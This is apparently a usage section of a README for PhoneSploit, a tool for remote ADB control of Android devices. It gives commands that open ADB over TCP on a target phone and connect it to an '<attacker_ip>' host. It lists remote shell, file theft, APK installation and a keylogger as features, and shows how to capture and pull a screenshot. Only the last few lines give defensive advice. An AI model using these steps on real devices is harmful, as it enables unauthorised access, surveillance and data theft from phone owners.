
## ▶️ Usage

### Start ADB Server
```
adb start-server
```

### Connect to Device

On the target device (with USB debugging enabled), run:
```
adb tcpip 5555
adb connect <attacker_ip>:5555
```

From PhoneSploit:
```
python3 phonesploitpro.py
```

## 🧪 Features

|Feature|Description|
|---|---|
|Connect over IP|Remote ADB access via WiFi|
|Get device info|Model, brand, serial|
|Install APK|Push and install APKs|
|Pull files|Download files from device|
|Screenshot|Capture device screen|
|Shell access|Remote ADB shell|
|Keylogger (Pro versions)|Capture keystrokes|

## 🧠 Example: Take Screenshot
```
adb shell screencap -p /sdcard/screen.png
adb pull /sdcard/screen.png
```

## 🛡️ Security Recommendations

If you're defending against PhoneSploit:

- Disable **USB debugging** on non-development devices.
    
- Avoid connecting Android devices to unknown WiFi.
    
- Use mobile MDM or antivirus to monitor ADB access.

































